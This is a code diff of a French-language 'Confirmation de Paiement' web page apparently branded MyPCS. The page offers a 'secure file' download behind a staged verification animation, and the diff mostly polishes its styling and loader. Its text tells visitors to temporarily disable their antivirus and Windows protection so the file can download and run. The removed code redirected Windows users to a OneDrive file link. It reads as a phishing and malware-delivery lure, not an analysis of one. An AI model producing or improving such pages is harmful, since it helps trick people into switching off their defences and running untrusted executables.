@@ -6,8 +6,8 @@
   <title>Confirmation de Paiement</title>
   <style>
     body {
-      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-      background: linear-gradient(to right, #ff8c00, #ff5e62);
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #ff8c00, #ff5e62); /* Dégradé rose */
       margin: 0;
       padding: 0;
       color: #333;
@@ -21,10 +21,10 @@
       box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
       text-align: center;
     }
-    .logo, .footer-logo {
+    .logo {
       margin-bottom: 30px;
     }
-    .logo img, .footer-logo img {
+    .logo img {
       width: 200px;
       margin: 0 auto;
     }
@@ -34,15 +34,27 @@
       font-weight: bold;
       margin-bottom: 20px;
     }
+    /* Badge Paiement sécurisé */
+    .secure-badge {
+      font-size: 18px;
+      font-weight: bold;
+      color: #28a745; /* Vert sécurisé */
+      margin-top: 10px;
+    }
     .message {
       font-size: 18px;
       color: #555;
       line-height: 1.6;
       margin-bottom: 30px;
     }
+    /* Animation pour le bloc code */
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(10px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
     .code-box {
       background: #f9f9f9;
-      border-left: 6px solid #ff5e62;
+      border-left: 6px solid #ff5e62; /* Rose dégradé */
       padding: 20px;
       font-size: 22px;
       font-weight: bold;
@@ -52,6 +64,7 @@
       min-width: 60%;
       text-align: center;
       border-radius: 8px;
+      animation: fadeIn 1s ease-out; /* Animation de fade-in */
     }
     .download-info {
       background: #f4f6f9;
@@ -59,14 +72,14 @@
       padding: 15px;
       font-size: 14px;
       color: #555;
-      margin-bottom: 30px;
+      margin-bottom: 50px;
       text-align: left;
       border-radius: 8px;
     }
     .download-btn {
       display: inline-block;
       padding: 16px 30px;
-      background: #009246;
+      background: #88C541; /* Vert PCS */
       color: white;
       border-radius: 8px;
       font-size: 20px;
@@ -78,90 +91,63 @@
       width: 100%;
     }
     .download-btn:hover {
-      background: #007a3d;
+      background: #6fa534; /* version plus foncée au survol */
     }
     .note {
       font-size: 13px;
       color: #666;
       margin-top: 20px;
+      margin-bottom: 40px; /* Plus d'espace avant le footer */
     }
-    .warning {
-      color: #f00;
-      font-weight: bold;
-      display: none;
+    .footer-logo {
+      margin-top: 30px;
       text-align: center;
-      margin-top: 20px;
     }
-
-    .step-wrapper {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      margin: 20px 0;
-      min-height: 24px;
+    .footer-logo img {
+      width: 100px; /* Logo plus petit */
+      display: block;
+      margin: 0 auto;
     }
-
-    .spinner, .checkmark {
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-    }
-
-    .spinner {
-      border: 3px solid #ccc;
-      border-top: 3px solid #ff5e62;
-      animation: spin 1s linear infinite;
-    }
-
+    /* Loader - roue qui tourne */
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
 
-    .checkmark {
-      border: 2px solid #28a745;
-      position: relative;
-      animation: pop 0.3s ease-out forwards;
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #88C541; /* Vert PCS */
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 10px auto;
+      animation: spin 1s linear infinite;
     }
 
-    .checkmark::after {
-      content: "";
-      position: absolute;
-      left: 5px;
-      top: 2px;
-      width: 6px;
-      height: 12px;
-      border: solid #28a745;
-      border-width: 0 2px 2px 0;
-      transform: rotate(45deg);
-      opacity: 0;
-      animation: drawCheck 0.3s 0.2s forwards;
-    }
-
-    @keyframes drawCheck {
-      to { opacity: 1; }
-    }
-
-    @keyframes pop {
-      0% { transform: scale(0.8); }
-      100% { transform: scale(1); }
-    }
-
-    .footer-legal {
-      font-size: 11px;
-      color: #888;
-      margin-top: 40px;
-      line-height: 1.5;
-    }
-
-    .footer-legal a {
+    #loadingSteps p {
+      font-size: 18px;
       color: #666;
-      text-decoration: none;
+      margin: 10px 0;
     }
 
-    .footer-legal a:hover {
-      text-decoration: underline;
+    @keyframes blink {
+      0% { opacity: 0.2; }
+      50% { opacity: 1; }
+      100% { opacity: 0.2; }
+    }
+
+    .dot-loader span {
+      animation: blink 1.5s infinite;
+      font-weight: bold;
+      font-size: 22px;
+    }
+
+    .checkmark {
+      display: inline-block;
+      color: #88C541;
+      font-size: 32px;
+      animation: pulse 1.2s infinite;
+      margin-top: 10px;
     }
   </style>
 </head>
@@ -174,6 +160,10 @@
 
   <h1>Confirmation de Paiement en ligne</h1>
 
+  <div class="secure-badge">
+    <span>🔒 Paiement sécurisé</span>
+  </div>
+
   <div class="message">
     Merci pour votre paiement ! Nous avons pris toutes les mesures nécessaires pour garantir la sécurité de vos informations personnelles.<br><br>
     Vous pouvez maintenant télécharger le fichier de confirmation en utilisant le bouton ci-dessous.
@@ -184,20 +174,17 @@
   </div>
 
   <div class="download-info">
-    <strong>Important :</strong> Lors de l'ouverture du fichier, il est possible qu'une fenêtre vous demande de saisir ce code pour l'authentification. Si vous rencontrez des problèmes d'accès ou des blocages par votre antivirus ou protection Windows, il est conseillé de désactiver temporairement ces protections pour autoriser le téléchargement et l'exécution du fichier.
+    **Important** : Lors de l'ouverture du fichier, il est possible qu'une fenêtre vous demande de saisir ce code pour l'authentification. Si vous rencontrez des problèmes d'accès ou des blocages par votre antivirus ou protection Windows, il est conseillé de désactiver temporairement ces protections pour autoriser le téléchargement et l'exécution du fichier.
   </div>
 
-  <div id="loadingSteps">
-    <div class="step-wrapper">
-      <div class="spinner" id="loadingIcon"></div>
-      <div class="step-message">Vérification de la transaction...</div>
-    </div>
+  <div id="loadingSteps" style="text-align: center; display: none;">
+    <p id="step1">🔄 Vérification de la transaction...</p>
+    <p id="step2" style="display: none;">✅ Coupon reconnu</p>
+    <p id="step3" style="display: none;">✔️ Validation prête</p>
   </div>
 
-  <a id="downloadBtn" class="download-btn" href="#" style="display:none;">📥 Télécharger votre fichier sécurisé</a>
-
-  <div class="warning" id="warningMsg">
-    ❌ Ce téléchargement est uniquement disponible sur un ordinateur Windows.
+  <div id="buttonContainer" style="text-align: center;">
+    <a id="downloadBtn" class="download-btn" href="#" style="display: none;">📥 Télécharger votre fichier sécurisé</a>
   </div>
 
   <div class="note">
@@ -207,60 +194,43 @@
   <div class="footer-logo">
     <img src="logopcs.png" alt="Logo Footer">
   </div>
-
-  <div class="footer-legal">
-    <p>
-      © 2025 MyPCS - Tous droits réservés.<br>
-      Siège social : 123 Rue Fictive, 75000 Paris<br>
-      <a href="#">Mentions légales</a> | <a href="#">Conditions Générales d'Utilisation</a>
-    </p>
-  </div>
 </div>
 
 <script>
-  function isWindows() {
-    return navigator.userAgent.indexOf('Windows') !== -1;
-  }
+  function showLoadingSteps() {
+    document.getElementById("loadingSteps").style.display = "block";
+    document.getElementById("step1").style.display = "block";
 
-  const steps = [
-    "Vérification de la transaction...",
-    "Coupon reconnu",
-    "Validation prête"
-  ];
+    setTimeout(() => {
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+      document.getElementById("step2").innerHTML = "✅ Coupon reconnu";
+    }, 1500);
 
-  const stepText = document.querySelector(".step-message");
-  const loadingIcon = document.getElementById("loadingIcon");
-  const downloadBtn = document.getElementById("downloadBtn");
-  const stepWrapper = document.getElementById("loadingSteps");
+    setTimeout(() => {
+      document.getElementById("step2").style.display = "none";
+      document.getElementById("step3").style.display = "block";
+      document.getElementById("step3").innerHTML = "✔️ Validation prête";
+    }, 3000);
 
-  let currentStep = 0;
-
-  function showNextStep() {
-    if (currentStep < steps.length) {
-      stepText.textContent = steps[currentStep];
-      currentStep++;
-      setTimeout(showNextStep, 1500);
-    } else {
+    setTimeout(() => {
+      document.getElementById("loadingSteps").style.display = "none"; // On cache après la fin
+      document.getElementById("downloadBtn").style.display = "inline-block"; // Affiche le bouton de téléchargement
       const check = document.createElement("div");
-      check.classList.add("checkmark");
-      loadingIcon.replaceWith(check);
-
-      setTimeout(() => {
-        stepWrapper.style.display = "none";
-        downloadBtn.style.display = "inline-block";
-      }, 1000);
-    }
+      check.className = "checkmark";
+      check.innerHTML = "✔️";
+      document.getElementById("buttonContainer").appendChild(check);
+    }, 4500);
   }
 
-  showNextStep();
+  document.getElementById("downloadBtn").addEventListener("click", function (e) {
+    e.preventDefault();
+    showLoadingSteps();
 
-  downloadBtn.addEventListener("click", function(e) {
-    if (isWindows()) {
-      window.location.href = "https://1drv.ms/u/c/12f0ca2e1d729c4e/ETrWrT80lm1Ms5nkjkhq2cEBWrjd745KMyZSJ-8Vl5f1yw?e=DvoDKA";
-    } else {
-      e.preventDefault();
-      document.getElementById("warningMsg").style.display = "block";
-    }
+    // Affiche une roue de chargement pendant les étapes
+    const spinner = document.createElement("div");
+    spinner.className = "spinner";
+    document.getElementById("loadingSteps").appendChild(spinner);
   });
 </script>
 
